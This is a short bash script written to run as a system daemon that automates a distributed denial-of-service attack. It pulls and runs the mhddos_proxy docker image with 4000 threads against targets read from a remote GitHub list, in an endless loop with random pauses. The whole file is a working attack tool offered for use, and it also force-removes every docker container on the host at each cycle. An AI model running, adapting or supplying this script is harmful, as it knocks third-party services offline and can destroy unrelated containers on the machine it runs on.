#!/bin/bash
#Prepared script for use as a system deamon in unix-based systems for automated ddos via docker

duration="10m"
threads_count="-t 4000"
targets_source="-c https://raw.githubusercontent.com/uawarrior/project1/main/trgts0.txt"
more_params="-p 900 --debug --http-methods GET STRESS"

echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Start: Removing any existing docker containers"
docker rm -f $(docker ps -a -q)

while [ 1 == 1 ]
do
	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running: Updating the docker image and starting the execution for $duration"
	docker pull ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest
	#The following method doesnt work as it either cant connect to tty for interactive session while run from root, or cant call docker commands while run from user with tty...
	#gnome-terminal --command="docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $targets_source $threads_count $more_params"
	docker run --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $targets_source $threads_count $more_params &> /home/admuser/daemon-prep/mhd.log &
	sleep $duration

	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running: Removing the container"
	docker rm -f $(docker ps -a -q)
	chill_delay="$(shuf -i 4-7 -n 1)m"
	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Pause: Chilling for $chill_delay"
	sleep $chill_delay
done
